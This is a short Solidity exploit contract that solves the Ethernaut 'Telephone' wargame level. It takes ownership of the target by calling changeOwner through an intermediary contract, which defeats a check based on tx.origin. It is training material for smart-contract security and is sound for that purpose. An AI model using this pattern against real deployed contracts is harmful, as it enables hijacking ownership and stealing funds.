// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../ethernaut/Telephone.sol";

contract HackTelephone {
    Telephone private _telephoneContract;

    constructor(address telephoneContract) {
        _telephoneContract = Telephone(telephoneContract);
    }

    function attack(address desiredOwner) public {
        _telephoneContract.changeOwner(desiredOwner);
    }
}
